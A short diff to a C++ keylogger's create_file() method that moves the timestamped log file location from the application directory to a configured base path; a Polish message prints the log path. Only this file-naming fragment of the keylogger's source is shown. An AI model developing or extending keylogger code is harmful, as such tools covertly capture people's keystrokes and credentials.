@@ -245,12 +245,10 @@ std::string Keylogger::create_file()
 	time(&rawtime);
 	localtime_s(&timeinfo, &rawtime);
 
-	std::string application_path = utility::get_application_path();
-	std::string basepath = dirBasename(application_path);
 	char file_name[MAX_PATH];
 	char file_path[MAX_PATH];
 	strftime(file_name, 100, "%Y-%m-%d_%H-%M-%S", &timeinfo);
-	sprintf_s(file_path, MAX_PATH, "%s\\%s%s", basepath.c_str(), file_name, FILEEXT);
+	sprintf_s(file_path, MAX_PATH, "%s\\%s%s", configuration::logs_base_path.c_str(), file_name, FILEEXT);
 
 	printf("Logi sa zapisywane do: '%s'\n", file_path);
 
